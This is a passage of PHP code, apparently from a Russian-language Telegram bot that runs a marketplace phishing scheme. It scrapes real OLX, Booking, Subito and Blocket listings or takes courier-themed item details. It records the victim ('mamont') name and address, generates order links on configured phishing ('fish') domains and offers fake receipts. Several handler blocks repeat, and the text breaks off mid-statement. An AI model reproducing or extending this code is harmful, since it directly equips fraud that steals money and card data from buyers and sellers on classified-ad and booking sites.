                    'pid'=>NULL
                ); 
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize((object)$now_settings)));
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'message_id' => $post->message->message_id,   
                    'parse_mode'=>'HTML',
                    'text' => "Пришли ссылку на объект аренды ".$market->domain.($market->example!=null?"\n(пример: ".$market->example:')'),
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            }

            if($cm_code[2]=='inpost'||$cm_code[2]=='fancourier'||$cm_code[2]=='spedire'||$cm_code[2]=='ctt'||$cm_code[2]=='postnord'){
                //.$bot_config->countries->{$cm_code[1]}->markets->{$cm_code[2]}
                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard);  
                $market = $bot_config->countries->{$cm_code[1]}->markets->{$cm_code[2]};
                $now_settings = array(
                    'step'=>1,
                    'market'=>$cm_code[2],
                    'countries'=>$cm_code[1],
                    'pid'=>NULL
                ); 
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize((object)$now_settings)));
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'message_id' => $post->message->message_id,   
                    'parse_mode'=>'HTML',
                    'text' => "Введи название товара",
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }

            if($cm_code[2]=='subito'||$cm_code[2]=='blocket'){ 
                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard);  
                $market = $bot_config->countries->{$cm_code[1]}->markets->{$cm_code[2]};
                $now_settings = array(
                    'step'=>1,
                    'market'=>$cm_code[2],
                    'countries'=>$cm_code[1],
                    'pid'=>NULL
                ); 
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize((object)$now_settings)));
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'message_id' => $post->message->message_id,   
                    'parse_mode'=>'HTML',
                    'text' => "Пришли ссылку на товар сайта ".$market->domain.($market->example!=null?"\n(пример: ".$market->example:')'),
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            }
 

            
 
        }    
        if($usr->now_settings!=''&&$post->message->text!=''){
            $usr->now_settings = unserialize($usr->now_settings);
            if($usr->now_settings->market=='inpost'||$usr->now_settings->market=='fancourier'||$usr->now_settings->market=='spedire'||$usr->now_settings->market=='ctt'||$usr->now_settings->market=='postnord'){
                if($usr->now_settings->step==1&&$usr->now_settings->market){ 
                    if($usr->now_settings->countries=='se'){
                        $currancy = "SEK";
                    }
                    if($usr->now_settings->countries=='ro'){
                        $currancy = "RON";
                    }
                    if($usr->now_settings->countries=='pl'){
                        $currancy = "PLN";
                    }
                    if($usr->now_settings->countries=='it'||$usr->now_settings->countries=='pt'){
                        $currancy = "EUR";
                    }
                    $p = $con->products->add_product(array(
                        'uid'       =>  $usr->id,
                        'title'     =>  $post->message->text,
                        'country'   =>  $usr->now_settings->countries,
                        'market'   =>  $usr->now_settings->market,
                        'currancy' => $currancy
                    )); 
                    $usr->now_settings->step=4;
                    $usr->now_settings->pid=$p['id'];
                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введи стоимость товара"
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    exit();
                }
                
                if($usr->now_settings->step==5){
                    $con->products->update_product($usr->now_settings->pid,array(
                        'address'    =>  $post->message->text
                    )); 
                    $usr->now_settings->step=6;
                    
                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 
 
                    $replyMarkup='';
                    if($usr->tags!=''){
                        $usr->tags = unserialize($usr->tags);
                        $usr->tags->address = $post->message->text;
                        $inline_keyboard = array(
                            array($usr->tags->name),
                            array("Отмена")
                        );
                        $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                        $replyMarkup = json_encode($keyboard);  
                    }else{
                        if($post->message->text!='Отмена'){
                            $usr->tags = (object)array('name'=>'','address'=>$post->message->text);
                        }
                    }
                    $con->user->update_user($usr->chat_id,array("tags"=>serialize($usr->tags)));

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введи имя получателя (Пример: Иванов Иван)",
                        'reply_markup'=>$replyMarkup
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    exit();
                }
                if(($usr->now_settings->step==6||$usr->now_settings->step==4)){ 

                    if($usr->now_settings->step==4){
                        if (preg_match('/^[0-9.]+$/i', $post->message->text)){
                            $con->products->update_product($usr->now_settings->pid,array('price'=>$post->message->text));

                            $replyMarkup='';
                            if($usr->tags!=''){
                                $usr->tags = unserialize($usr->tags); 
                                $inline_keyboard = array(
                                    array($usr->tags->address),
                                    array("Отмена")
                                );
                                $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                                $replyMarkup = json_encode($keyboard);  
                            } 

                            $data = [
                                'chat_id' => $post->message->chat->id, 
                                'parse_mode'=>'HTML',
                                'text' => "Введи адрес доставки",
                                'reply_markup'=>$replyMarkup
                            ];  
                            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                            $usr->now_settings->step=5;
                            $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 
                            exit();
                        }else{
                            $data = [
                                'chat_id' => $post->message->chat->id, 
                                'parse_mode'=>'HTML',
                                'text' => "Ты можешь вводить только цифры?"
                            ];  
                            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                            exit();
                        }
                    }
                    $product = (object)$con->products->get_product($usr->now_settings->pid);

                    if(!$product->generate_link){
                        $generate_link = $bot_config->countries->{$usr->now_settings->countries}->markets->{$usr->now_settings->market}->fish."/order/".$usr->now_settings->pid;

                        
                        $con->products->update_product($usr->now_settings->pid,array('mamont_name'=>$post->message->text,'generate_link'=>$generate_link));
                        $product->generate_link=$generate_link;
                    } 
                    if($usr->tags!=''){
                        $usr->tags = unserialize($usr->tags);
                        if($post->message->text!='Отмена'){ $usr->tags->name = $post->message->text; }
                    }else{ 
                        if($post->message->text!='Отмена'){
                            $usr->tags = (object)array('name'=>$post->message->text,'address'=>'');
                        }
                    } 
                    $con->user->update_user($usr->chat_id,array("now_settings"=>'',"tags"=>serialize($usr->tags))); 

                    $inline_keyboard=[];
                    if(($bot_config->markets->{$product->country}&&$bot_config->markets->{$product->country}->check)||$bot_config->countries->{$product->country}->markets->{$product->market}->check){
                        $inline_keyboard[]=array(
                            array("text" => "✅ Получить чек","callback_data" => "/get_check_".$product->id),
                            array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                        );
                    }else{
                        $inline_keyboard[]=array(
                            array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                        );
                    }
                    $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back"));

                    $keyboard = array("inline_keyboard" => $inline_keyboard);
                    $replyMarkup = json_encode($keyboard); 

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'text'=>'Готово!',
                        'reply_markup'=>json_encode(array('remove_keyboard'=>true))
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 

                    $keyboard = array("inline_keyboard" => $inline_keyboard);
                    $replyMarkup = json_encode($keyboard);   
                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        "disable_web_page_preview"=>true,
                        'text' => "📦 Товар: ".$product->title."\n💲 Стоимость: ".$product->price." ".$product->currancy."\n\n✅ Готово! Удачной работы:)\n\n🔗 Ссылка: ".$product->generate_link,
                        'reply_markup'=>$replyMarkup
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
                    exit();
                }  
            } 

        }  

        /* OLX */ 
            if(strpos($post->message->text,'https://')!==false&&$usr->now_settings!=''&&$usr->now_settings->market=='olx'){
                //$usr->now_settings = unserialize($usr->now_settings);
                if($usr->now_settings->step==1){ 
                
                    $page = file_get_contents($post->message->text);
                    if($usr->now_settings->countries=='pe'){
                        preg_match_all('/window.__APP = {(.*)};\n/s', $page, $matches);  
                        $matches = str_replace("props:",'"props":',$matches[1][0]);
                        $matches = str_replace("states:",'"states":',$matches);
                        $matches = str_replace("config:",'"config":',$matches);
                        $matches = str_replace("translations:",'"translations":',$matches); 
                        $matches = json_decode('{'.$matches.'}');
                    }else{
                        preg_match_all('/window\.__PRERENDERED_STATE__= "(.*)";/U', $page, $matches);
                        $matches = stripcslashes($matches[1][0]);
                        $matches = json_decode($matches);
                    }
                    //file_put_contents('./log.txt',json_encode($matches)."\n\n"); 
                    if($usr->now_settings->countries=='pe'){   
                        $element = reset($matches->states->items->elements);
                        $p = $con->products->add_product(array(
                            'uid'       =>  $usr->id,
                            'title'     =>  $element->title,
                            'price'     =>  $element->price->value->raw,
                            'currancy'  =>  $element->price->value->currency->iso_4217,
                            'link'      =>  $post->message->text,
                            'img'       =>  $element->images[0]->url,
                            'country'   =>  $usr->now_settings->countries,
                            'market'   =>  $usr->now_settings->market,
                        )); 
                    }else{
                        $p = $con->products->add_product(array(
                                'uid'       =>  $usr->id,
                                'title'     =>  $matches->ad->ad->title,
                                'price'     =>  $matches->ad->ad->price->regularPrice->value,
                                'currancy'  =>  $matches->ad->ad->price->regularPrice->currencyCode,
                                'link'      =>  $matches->ad->ad->url,
                                'img'       =>  $matches->ad->ad->photos[0],
                                'country'   =>  $usr->now_settings->countries,
                                'market'   =>  $usr->now_settings->market,
                            ));  
                    }
                    $usr->now_settings->step=2;
                    $usr->now_settings->pid=$p['id'];
                            
                            $replyMarkup='';
                            if($usr->tags!=''){
                                $usr->tags = unserialize($usr->tags); 
                                $inline_keyboard = array(
                                    array($usr->tags->address),
                                    array("Отмена")
                                );
                                $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                                $replyMarkup = json_encode($keyboard);  
                            } 

                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введи адрес доставки",
                        'reply_markup'=>$replyMarkup
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    
                    exit();
                }
                
            }

            /* BOOKING */ 
            if(strpos($post->message->text,'https://')!==false&&$usr->now_settings!=''&&$usr->now_settings->market=='booking'){ 
                if($usr->now_settings->step==1){ 
                
                    $page = file_get_contents($post->message->text);
                    $page = str_replace("\n","",$page);
                    preg_match_all("/<script type=\"application\/ld\+json\" nonce=\"(.*)\">(.*)<\/script>/U", $page, $matches);  
                        $matches = stripcslashes($matches[2][0]);
                        $matches = json_decode($matches);
                       
                        $p = $con->products->add_product(array(
                            'uid'       =>  $usr->id,
                            'title'     =>  $matches->name,
                            'link'      =>  $matches->url,
                            'img'       =>  $matches->image,
                            'country'   =>  $usr->now_settings->countries,
                            'market'    =>  $usr->now_settings->market,
                            'address'   => $matches->address->streetAddress
                        )); 
                     
                    $usr->now_settings->step=22;
                    $usr->now_settings->pid=$p['id'];
                             

                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введи дату заселения в формате <code>29.09.2021</code>"
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    
                    exit();
                }
                
            }

            if($post->message->text!=''){
                //$usr->now_settings = unserialize($usr->now_settings);
                if($usr->now_settings->step==2){
                    $usr->now_settings->step=3;
                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings)));
                    
                    $con->products->update_product($usr->now_settings->pid,array('address'=>$post->message->text));
                    
                    $replyMarkup='';
                    if($usr->tags!=''){
                        $usr->tags = unserialize($usr->tags);
                        $usr->tags->address = $post->message->text;
                        $inline_keyboard = array(
                            array($usr->tags->name),
                            array("Отмена")
                        );
                        $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                        $replyMarkup = json_encode($keyboard);  
                    }else{
                        if($post->message->text!='Отмена'){
                            $usr->tags = (object)array('name'=>'','address'=>$post->message->text);
                        }
                    }
                    $con->user->update_user($usr->chat_id,array("tags"=>serialize($usr->tags)));

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введи имя получателя (Пример: Иванов Иван)",
                        'reply_markup'=>$replyMarkup
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    exit();
                }
                if($usr->now_settings->step==22){
                    $usr->now_settings->step=23;
                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings)));
                    
                    $con->products->update_product($usr->now_settings->pid,array('checkindate'=>$post->message->text));
                     

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введи дату выезда в формате <code>29.09.2021</code>"
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    exit();
                }
                if($usr->now_settings->step==23){
                    $usr->now_settings->step=24;
                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings)));
                    
                    $con->products->update_product($usr->now_settings->pid,array('checkoutdate'=>$post->message->text));
                    $inline_keyboard[]=array(
                        array("text" => "USD","callback_data" => "USD"),
                        array("text" => "EUR","callback_data" => "EUR"),
                        array("text" => "GBP","callback_data" => "GBP")
                    );
                    $keyboard = array("inline_keyboard" => $inline_keyboard);
                    $replyMarkup = json_encode($keyboard);   
                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Выбери валюту в которой будет указана цена",
                        'reply_markup'=>$replyMarkup
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    exit();
                }
                if($usr->now_settings->step==24){
                    $usr->now_settings->step=25;
                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings)));
                    
                    $con->products->update_product($usr->now_settings->pid,array('currancy'=>$post->message->text));
                    
                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введи цену"
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    exit();
                }
                if(($usr->now_settings->step==3||$usr->now_settings->step==4||$usr->now_settings->step==25)){ 

                    if($usr->now_settings->step==4||$usr->now_settings->step==25){
                        if (preg_match('/^[0-9.]+$/i', $post->message->text)){
                            $con->products->update_product($usr->now_settings->pid,array('price'=>$post->message->text));
                        }else{
                            $data = [
                                'chat_id' => $post->message->chat->id, 
                                'parse_mode'=>'HTML',
                                'text' => "Ты можешь вводить только цифры?"
                            ];  
                            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                            exit();
                        }
                    }
                    $product = (object)$con->products->get_product($usr->now_settings->pid);

                    if(!$product->generate_link){
                        if($usr->now_settings->step==25){
                            $generate_link = $bot_config->markets->{$usr->now_settings->countries}->fish."/order/".$usr->now_settings->pid;
                        }else{
                            $generate_link = $bot_config->countries->{$usr->now_settings->countries}->markets->{$usr->now_settings->market}->fish."/order/".$usr->now_settings->pid;
                        }

                        $con->products->update_product($usr->now_settings->pid,array('mamont_name'=>$post->message->text,'generate_link'=>$generate_link));
                        $product->generate_link=$generate_link;
                    }

                    if($usr->tags!=''){
                        $usr->tags = unserialize($usr->tags);
                        if($post->message->text!='Отмена'){ $usr->tags->name = $post->message->text; }
                    }else{ 
                        if($post->message->text!='Отмена'){
                            $usr->tags = (object)array('name'=>$post->message->text,'address'=>'');
                        }
                    } 
                    $con->user->update_user($usr->chat_id,array("now_settings"=>'',"tags"=>serialize($usr->tags))); 

                    $inline_keyboard=[];
                    if(($bot_config->markets->{$product->country}&&$bot_config->markets->{$product->country}->check)||$bot_config->countries->{$product->country}->markets->{$product->market}->check){
                        $inline_keyboard[]=array(
                            array("text" => "✅ Получить чек","callback_data" => "/get_check_".$product->id),
                            array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                        );
                    }else{
                        $inline_keyboard[]=array(
                            array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                        );
                    }
                    $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back"));

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'text'=>'Готово!',
                        'reply_markup'=>json_encode(array('remove_keyboard'=>true))
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 

                    $keyboard = array("inline_keyboard" => $inline_keyboard);
                    $replyMarkup = json_encode($keyboard);   
                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        "disable_web_page_preview"=>true,
                        'text' => "📦 Товар: ".$product->title."\n💲 Стоимость: ".$product->price." ".$product->currancy."\n\n✅ Готово! Удачной работы:)\n\n🔗 Ссылка: ".$product->generate_link,
                        'reply_markup'=>$replyMarkup
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
                    exit();
                } 
                
            }  
        
        /* SUBITO */ 
        if(strpos($post->message->text,'https://')!==false&&$usr->now_settings!=''&&$usr->now_settings->market=='subito'){ 
            if($usr->now_settings->step==1){ 
                
                $page = file_get_contents($post->message->text);
                preg_match_all('/{"@context":"https:\/\/schema.org",(.*)}/U', $page, $matches);  
                $matches = stripcslashes($matches[0][0]);
                $matches = str_replace("\n"," ",$matches);
                $matches = json_decode(''.$matches.'}');

                //file_put_contents('./log.txt',json_encode($matches)."\n\n"); 
                
            $p = $con->products->add_product(array(
                    'uid'       =>  $usr->id,
                    'title'     =>  $matches->name,
                    'price'     =>  $matches->offers->price,
                    'currancy'  =>  'EUR',
                    'link'      =>  $matches->offers->url,
                    'img'       =>  $matches->image[0],
                    'country'   =>  $usr->now_settings->countries,
                    'market'   =>  $usr->now_settings->market,
                )); 
                $usr->now_settings->step=2;
                $usr->now_settings->pid=$p['id'];
                        
                        $replyMarkup='';
                        if($usr->tags!=''){
                            $usr->tags = unserialize($usr->tags); 
                            $inline_keyboard = array(
                                array($usr->tags->address),
                                array("Отмена")
                            );
                            $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                            $replyMarkup = json_encode($keyboard);  
                        } 

                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 

                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    'text' => "Введи адрес доставки",
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                
                exit();
            }
            
        }
         /* blocket */ 
         if(strpos($post->message->text,'https://')!==false&&$usr->now_settings!=''&&$usr->now_settings->market=='blocket'){ 
            if($usr->now_settings->step==1){ 
                
                $page = file_get_contents($post->message->text);

                preg_match_all('/<script id="__NEXT_DATA__" type="application\/json">(.*)<\/script>/s', $page, $matches);  

                $matches = json_decode($matches[1][0]); 
                $header = array();
                $header[]="authorization: Bearer ".$matches->props->pageProps->initialReduxState->authentication->bearerToken;

                $cr = curl_init('https://api.blocket.se/search_bff/v1/content/'.$matches->query->adId.'?status=all');
                curl_setopt($cr, CURLOPT_HTTPHEADER,$header);  
                curl_setopt($cr, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($cr, CURLOPT_FOLLOWLOCATION, true);
                $rest = curl_exec($cr);  
                $rest = html_entity_decode($rest);
                curl_close($cr); 
                
                $matches = json_decode($rest,false); 

                //file_put_contents('./log.txt',json_encode($matches)."\n\n"); 
                
            $p = $con->products->add_product(array(
                    'uid'       =>  $usr->id,
                    'title'     =>  $matches->data->subject,
                    'price'     =>  $matches->data->price->value,
                    'currancy'  =>  'SEK',
                    'link'      =>  $post->message->text,
                    'img'       =>  $matches->data->images[0]->url,
                    'country'   =>  $usr->now_settings->countries,
                    'market'   =>  $usr->now_settings->market,
                )); 
                $usr->now_settings->step=2;
                $usr->now_settings->pid=$p['id'];
                        
                        $replyMarkup='';
                        if($usr->tags!=''){
                            $usr->tags = unserialize($usr->tags); 
                            $inline_keyboard = array(
                                array($usr->tags->address),
                                array("Отмена")
                            );
                            $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                            $replyMarkup = json_encode($keyboard);  
                        } 

                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 

                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    'text' => "Введи адрес доставки",
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                
                exit();
            }
            
        }
        if($post->message->text!=''){
            //$usr->now_settings = unserialize($usr->now_settings);
            if($usr->now_settings->step==2){
                $usr->now_settings->step=3;
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings)));
                
                $con->products->update_product($usr->now_settings->pid,array('address'=>$post->message->text));
                
                $replyMarkup='';
                if($usr->tags!=''){
                    $usr->tags = unserialize($usr->tags);
                    $usr->tags->address = $post->message->text;
                    $inline_keyboard = array(
                        array($usr->tags->name),
                        array("Отмена")
                    );
                    $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                    $replyMarkup = json_encode($keyboard);  
                }else{
                    if($post->message->text!='Отмена'){
                        $usr->tags = (object)array('name'=>'','address'=>$post->message->text);
                    }
                }
                $con->user->update_user($usr->chat_id,array("tags"=>serialize($usr->tags)));

                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    'text' => "Введи имя получателя (Пример: Иванов Иван)",
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                exit();
            }
            if(($usr->now_settings->step==3||$usr->now_settings->step==4)){ 

                if($usr->now_settings->step==4){
                    if (preg_match('/^[0-9.]+$/i', $post->message->text)){
                        $con->products->update_product($usr->now_settings->pid,array('price'=>$post->message->text));
                    }else{
                        $data = [
                            'chat_id' => $post->message->chat->id, 
                            'parse_mode'=>'HTML',
                            'text' => "Ты можешь вводить только цифры?"
                        ];  
                        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                        exit();
                    }
                }
                $product = (object)$con->products->get_product($usr->now_settings->pid);

                if(!$product->generate_link){
                    $generate_link = $bot_config->countries->{$usr->now_settings->countries}->markets->{$usr->now_settings->market}->fish."/order/".$usr->now_settings->pid;

                    $con->products->update_product($usr->now_settings->pid,array('mamont_name'=>$post->message->text,'generate_link'=>$generate_link));
                    $product->generate_link=$generate_link;
                }

                if($usr->tags!=''){
                    $usr->tags = unserialize($usr->tags);
                    if($post->message->text!='Отмена'){ $usr->tags->name = $post->message->text; }
                }else{ 
                    if($post->message->text!='Отмена'){
                        $usr->tags = (object)array('name'=>$post->message->text,'address'=>'');
                    }
                } 
                $con->user->update_user($usr->chat_id,array("now_settings"=>'',"tags"=>serialize($usr->tags))); 

                $inline_keyboard=[];
                if(($bot_config->markets->{$product->country}&&$bot_config->markets->{$product->country}->check)||$bot_config->countries->{$product->country}->markets->{$product->market}->check){
                    $inline_keyboard[]=array(
                        array("text" => "✅ Получить чек","callback_data" => "/get_check_".$product->id),
                        array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                    );
                }else{
                    $inline_keyboard[]=array(
                        array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                    );
                }
                $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back"));

                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'text'=>'Готово!',
                    'reply_markup'=>json_encode(array('remove_keyboard'=>true))
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 

                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard);   
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    "disable_web_page_preview"=>true,
                    'text' => "📦 Товар: ".$product->title."\n💲 Стоимость: ".$product->price." ".$product->currancy."\n\n✅ Готово! Удачной работы:)\n\n🔗 Ссылка: ".$product->generate_link,
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
                exit();
            } 

            if(strpos($post->message->text,'https://')!==false&&$usr->now_settings!=''&&$usr->now_settings->market=='subito'){ 
                if($usr->now_settings->step==1){ 
                    
                    $page = file_get_contents($post->message->text);
                    preg_match_all('/{"@context":"https:\/\/schema.org",(.*)}/U', $page, $matches);  
                    $matches = stripcslashes($matches[0][0]);
                    $matches = str_replace("\n"," ",$matches);
                    $matches = json_decode(''.$matches.'}');

                    //file_put_contents('./log.txt',json_encode($matches)."\n\n"); 
                    
                $p = $con->products->add_product(array(
                        'uid'       =>  $usr->id,
                        'title'     =>  $matches->name,
                        'price'     =>  $matches->offers->price,
                        'currancy'  =>  'EUR',
                        'link'      =>  $matches->offers->url,
                        'img'       =>  $matches->image[0],
                        'country'   =>  $usr->now_settings->countries,
                        'market'   =>  $usr->now_settings->market,
                    )); 
                    $usr->now_settings->step=2;
                    $usr->now_settings->pid=$p['id'];
                            
                            $replyMarkup='';
                            if($usr->tags!=''){
                                $usr->tags = unserialize($usr->tags); 
                                $inline_keyboard = array(
                                    array($usr->tags->address),
                                    array("Отмена")
                                );
                                $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                                $replyMarkup = json_encode($keyboard);  
                            } 

                    $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 

                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введи адрес доставки",
                        'reply_markup'=>$replyMarkup
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    
                    exit();
                }
            }
            
        }
        if($post->message->text!=''){
            //$usr->now_settings = unserialize($usr->now_settings);
            if($usr->now_settings->step==2){
                $usr->now_settings->step=3;
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings)));
                
                $con->products->update_product($usr->now_settings->pid,array('address'=>$post->message->text));
                
                $replyMarkup='';
                if($usr->tags!=''){
                    $usr->tags = unserialize($usr->tags);
                    $usr->tags->address = $post->message->text;
                    $inline_keyboard = array(
                        array($usr->tags->name),
                        array("Отмена")
                    );
                    $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                    $replyMarkup = json_encode($keyboard);  
                }else{
                    if($post->message->text!='Отмена'){
                        $usr->tags = (object)array('name'=>'','address'=>$post->message->text);
                    }
                }
                $con->user->update_user($usr->chat_id,array("tags"=>serialize($usr->tags)));

                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    'text' => "Введи имя получателя (Пример: Иванов Иван)",
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                exit();
            }
            if(($usr->now_settings->step==3||$usr->now_settings->step==4)){ 

                if($usr->now_settings->step==4){
                    if (preg_match('/^[0-9.]+$/i', $post->message->text)){
                        $con->products->update_product($usr->now_settings->pid,array('price'=>$post->message->text));
                    }else{
                        $data = [
                            'chat_id' => $post->message->chat->id, 
                            'parse_mode'=>'HTML',
                            'text' => "Ты можешь вводить только цифры?"
                        ];  
                        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                        exit();
                    }
                }
                $product = (object)$con->products->get_product($usr->now_settings->pid);

                if(!$product->generate_link){
                    $generate_link = $bot_config->countries->{$usr->now_settings->countries}->markets->{$usr->now_settings->market}->fish."/order/".$usr->now_settings->pid;

                    $con->products->update_product($usr->now_settings->pid,array('mamont_name'=>$post->message->text,'generate_link'=>$generate_link));
                    $product->generate_link=$generate_link;
                }

                if($usr->tags!=''){
                    $usr->tags = unserialize($usr->tags);
                    if($post->message->text!='Отмена'){ $usr->tags->name = $post->message->text; }
                }else{ 
                    if($post->message->text!='Отмена'){
                        $usr->tags = (object)array('name'=>$post->message->text,'address'=>'');
                    }
                } 
                $con->user->update_user($usr->chat_id,array("now_settings"=>'',"tags"=>serialize($usr->tags))); 

                $inline_keyboard=[];
                if(($bot_config->markets->{$product->country}&&$bot_config->markets->{$product->country}->check)||$bot_config->countries->{$product->country}->markets->{$product->market}->check){
                    $inline_keyboard[]=array(
                        array("text" => "✅ Получить чек","callback_data" => "/get_check_".$product->id),
                        array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                    );
                }else{
                    $inline_keyboard[]=array(
                        array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                    );
                }
                $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back"));

                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'text'=>'Готово!',
                    'reply_markup'=>json_encode(array('remove_keyboard'=>true))
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 

                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard);   
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    "disable_web_page_preview"=>true,
